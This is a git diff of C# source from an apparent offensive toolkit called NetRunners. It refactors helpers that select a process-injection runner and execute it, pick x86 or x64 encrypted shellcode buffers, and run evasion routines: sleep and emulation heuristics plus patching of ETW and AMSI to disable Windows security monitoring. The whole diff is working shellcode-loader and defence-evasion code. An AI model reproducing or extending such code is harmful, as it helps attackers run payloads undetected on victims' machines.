@@ -19,14 +19,16 @@ namespace NetRunners.Helpers
         /// NetRunnersDll.dll   (Reflective Dll Loading) (DotNet2JScript) (Gadget2JScript)
         /// NetRunnersSvc.exe
         /// </affects>
-        public static void SelectRunner()
+        public static void SelectAndExecuteRunner()
         {
             //IRunner runner = new ClassicDllInjectionRunner();
             //IRunner runner = new ClassicProcessInjectionRunner();
             //IRunner runner = new EntryPointStompingProcessInjectionRunner();
             //IRunner runner = new ProcessInjectionRunner();
-            IRunner runner = new SuspendedProcessInjectionRunner();
-            //IRunner runner = new DefaultRunner();
+            //IRunner runner = new NewProcessInjectionRunner();
+            IRunner runner = new DefaultRunner();
+
+            runner.Run();
 
             return;
         }
@@ -58,18 +60,20 @@ namespace NetRunners.Helpers
         /// This method execute vairous evasive functions. If any fail, the program exits.
         /// </summary>
         /// <remarks>
-        /// Sometimes it is necessary to skip patching amsi, in that case comment the call out
+        /// Sometimes it is necessary to skip a check, in that case comment it out
         /// </remarks>
         /// <affects>
         /// All binaries in this solution
         /// </affects>
-        public static void PerformChecks()
+        public static void PerformEvasion()
         {
             Console.WriteLine("[+] EVASION IN PROGRESS\n");
-            if (!SleepHeuristic.Check()
+            if (
+                !SleepHeuristic.Check()
                 || !NonEmulatedApiHeuristic.Check()
                 || !EtwPatcher.Patch()
-                || !AmsiPatcher.Patch())
+                || !AmsiPatcher.Patch()
+            )
             {
                 Environment.Exit(1);
             }
@@ -86,26 +90,13 @@ namespace NetRunners.Helpers
         /// NetRunnersDll.dll
         /// NetRunnersSvc.exe
         /// </affects>
-        public static byte[] SelectPayloadArchitecture(bool? IsRemote32BitProcess = null)
+        public static byte[] SelectPayloadArchitecture(bool Is32BitProcess)
         {
-            if (IsRemote32BitProcess.HasValue)
-            {
-                // define buf var using bitness of remote process
-                buf = (IsRemote32BitProcess == true)
-                    ? NetRunners.Data.EncryptedData.buf86
-                    : NetRunners.Data.EncryptedData.buf;
-
-                Console.WriteLine("[+] " + (IsRemote32BitProcess == true ? "x86" : "x64") + " shellcode selected for remote process.");
-            }
-            else
-            {
-                // define buf var using bitness of current process
-                buf = (IntPtr.Size == 4)
-                    ? NetRunners.Data.EncryptedData.buf86
-                    : NetRunners.Data.EncryptedData.buf;
-
-                Console.WriteLine("[+] " + ((IntPtr.Size == 4) == true ? "x86" : "x64") + " shellcode selected for current process.");
-            }
+            buf = (Is32BitProcess == true)
+                ? NetRunners.Data.EncryptedData.buf86
+                : NetRunners.Data.EncryptedData.buf;
+            
+            Console.WriteLine("[+] " + (Is32BitProcess == true ? "x86" : "x64") + " shellcode selected");
             return buf;
         }
         /// <summary>
@@ -116,22 +107,12 @@ namespace NetRunners.Helpers
         /// NetRunnersDll.dll
         /// NetRunnersSvc.exe
         /// </affects>        
-        public static int SelectPayloadSize(bool? IsRemote32BitProcess = null)
+        public static int SelectPayloadSize(bool IsRemote32BitProcess)
         {
-            if (IsRemote32BitProcess.HasValue)
-            {
-                // define sBuf var using bitness of remote process
-                sBuf = (IsRemote32BitProcess == true)
-                    ? NetRunners.Data.EncryptedData.sBuf86
-                    : NetRunners.Data.EncryptedData.sBuf;
-            }
-            else
-            {
-                // define buf var using bitness of current process
-                sBuf = (IntPtr.Size == 4)
-                    ? NetRunners.Data.EncryptedData.sBuf86
-                    : NetRunners.Data.EncryptedData.sBuf;
-            }
+            sBuf = (IsRemote32BitProcess == true)
+                ? NetRunners.Data.EncryptedData.sBuf86
+                : NetRunners.Data.EncryptedData.sBuf;
+            
             return sBuf;
         }
         /// <summary>
